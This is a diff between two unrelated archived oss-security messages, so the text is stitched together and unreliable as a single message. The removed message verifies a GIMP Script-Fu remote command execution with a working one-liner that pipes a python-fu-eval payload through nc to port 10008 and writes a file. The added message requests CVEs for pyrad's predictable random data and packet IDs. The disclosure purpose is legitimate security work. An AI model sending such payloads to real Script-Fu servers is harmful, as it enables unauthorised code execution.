@@ -1,52 +1,35 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/09/15/1
-Message-ID: <52350E78.9040800@pipping.org>
-Date: Sun, 15 Sep 2013 03:33:44 +0200
-From: Sebastian Pipping <sebastian@...ping.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/02/15/9
+Message-ID: <20130215161436.GD3015@redhat.com>
+Date: Fri, 15 Feb 2013 09:14:36 -0700
+From: Vincent Danen <vdanen@...hat.com>
 To: oss-security@...ts.openwall.com
-CC: research <research@...ctionis.co.uk>
-Subject: Re: GIMP Scriptfu Python Remote Command Execution
+Subject: CVE request: python-pyrad insecurities
 Content-Type: text/plain; charset=utf-8
 
-On 16.08.2012 23:00, research wrote:
-> Affected Products
-> =================
-> 
-> GIMP 2.6 branch (Windows or Linux builds)
-> 
-> Non-Affected Products
-> =====================
-> 
-> The Scriptfu network server component does not currently work in the GIMP
-> 2.8 branch 
-> (Windows or Linux builds). 
+Could a CVE be assigned to the following two issues please?
 
-I was able to verify that vulnerability with Gimp 2.8.6 on my local
-machine so at least some versions of the Gimp 2.8.x series seem affected
-to me.  This is my shell session:
+#1: https://bugzilla.redhat.com/show_bug.cgi?id=911682
 
+Nathaniel McCallum of Red Hat reported that pyrad was using Python's
+random module in a number of places to generate pseudo-random data.  In
+the case of the authenticator data, it was being used to secure a
+password sent over the wire.  Because Python's random module is not
+really suited for this purpose (not random enough), it could lead to
+password hashing that may be predictable.
 
-$ rm /tmp/owned
+#2: https://bugzilla.redhat.com/show_bug.cgi?id=911685
 
-$ p='(python-fu-eval 0 "open('"'"'/tmp/owned'"'"', '"'"'w'"'"')")';
-printf "G\x0\x2c%s" "${p}" | nc -w 1 localhost 10008 | od -c
-0000000   G  \0  \0  \a   S   u   c   c   e   s   s
-0000013
-
-$ ls -al /tmp/owned
--rw-r--r-- 1 user user 0 Sep 15 02:56 /tmp/owned
+Nathaniel McCallum of Red Hat reported that pyrad was creating
+serialized RADIUS packet IDs in the CreateID() function in packet.py.
+This is not suitable for RADIUS as the RFC specifies that the ID must
+not be predictable.  As a result, the ID of the next packet sent can be
+spoofed.
 
 
-The server started from the GUI seems to be listening anywhere:
+These have been corrected in upstream's forthcoming version 2.1 via:
 
+https://github.com/wichert/pyrad/commit/38f74b36814ca5b1a27d9898141126af4953bee5
 
-$ netstat -tulpen 2>/dev/null | fgrep script-fu
-tcp  0  0 0.0.0.0:10008  0.0.0.0:*  LISTEN  1000  102934  6392/script-fu
-
-
-Best,
-
-
-
-Sebastian
-
+-- 
+Vincent Danen / Red Hat Security Response Team 
